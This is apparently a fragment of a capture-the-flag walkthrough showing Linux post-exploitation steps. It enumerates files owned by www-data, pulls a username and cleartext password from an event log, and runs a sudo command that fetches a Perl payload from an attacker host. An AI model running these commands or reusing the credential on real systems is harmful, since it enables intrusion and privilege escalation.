



```
find / -user www-data 2>/dev/null | grep -vE "run|proc|var"
```

We have this output
```
/tmp/m.msg
/tmp/tmux-33
/usr/local/investigation/analysed_log
/dev/shm/pspy64
/dev/shm/e.sh
/dev/pts/2
/dev/pts/1
/dev/pts/0
```

Let's analyse the ```/usr/local/investigation/analysed_log```


Let's check now the file, we have
```
<Data Name="TargetUserName">SMorton</Data>
<Data Name="TargetUserName">Def@ultf0r3nz!csPa$$</Data>
```


```
sudo binary http://10.10.16.54:8000/pwned.pl lDnxUysaQn
```


